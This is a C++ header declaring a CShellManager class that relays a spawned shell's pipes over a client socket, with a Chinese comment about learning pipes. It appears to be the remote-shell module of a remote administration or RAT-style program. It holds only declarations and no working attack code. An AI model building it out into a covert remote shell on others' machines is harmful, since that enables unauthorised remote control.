// ShellManager.h: interface for the CShellManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SHELLMANAGER_H__033A4947_78F7_414A_BA66_1F8F686A8C5F__INCLUDED_)
#define AFX_SHELLMANAGER_H__033A4947_78F7_414A_BA66_1F8F686A8C5F__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000


#include "Manager.h"
class CShellManager  :public CManager
{
public:
	CShellManager::CShellManager(CClientSocket *pClient);
	virtual ~CShellManager();
	
	void CShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize);

private:
    HANDLE m_hReadPipeHandle;     
    HANDLE m_hWritePipeHandle;   
	HANDLE m_hReadPipeShell;
    HANDLE m_hWritePipeShell;
	
    HANDLE m_hProcessHandle; 
	HANDLE m_hThreadHandle;
   //以上的定义我们要学习Pipe


    HANDLE m_hThreadRead;
	HANDLE m_hThreadMonitor;

protected:
	static DWORD WINAPI ReadPipeThread(LPVOID lparam); 
	static DWORD WINAPI MonitorThread(LPVOID lparam);
};

#endif // !defined(AFX_SHELLMANAGER_H__033A4947_78F7_414A_BA66_1F8F686A8C5F__INCLUDED_)
